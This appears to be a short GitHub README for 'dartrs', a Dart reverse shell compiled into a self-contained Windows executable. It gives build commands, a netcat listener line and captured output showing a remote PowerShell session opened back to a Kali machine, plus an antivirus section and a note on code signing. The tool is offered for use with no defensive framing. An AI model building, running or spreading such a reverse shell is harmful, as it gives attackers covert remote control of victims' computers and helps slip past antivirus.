# dartrs

portable dart based reverse shell (self-contained executable)

**Build**

```
root@kali:/opt/dartrs# apt-get install dart

```
- https://dart.dev/get-dart

**Usage**

create a self-contained binary. (cross compilation is not support by dart2native yet)
- https://medium.com/dartlang/dart2native-a76c815e6baf

```
C:\Users\IEUser\Desktop\dart2native dartrs.dart
Generated: c:/users/ieuser/desktop/dartrs.exe

```

```
root@WOPR-KALI:~# nc -lvp 8080
listening on [any] 8080 ...
connect to [192.168.1.99] from WOPR-KALI [192.168.1.99] 33474
whoami
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\IEUser\Desktop> whoami
msedgewin10\ieuser

```

**AV**

![Screenshot_2019-11-29_00-15-58](https://user-images.githubusercontent.com/56988989/69836016-ab08b100-123d-11ea-8a33-31703da026da.png)

**Limitations**

Code signing issue. (https://github.com/dart-lang/sdk/issues/39106)

Enjoy~
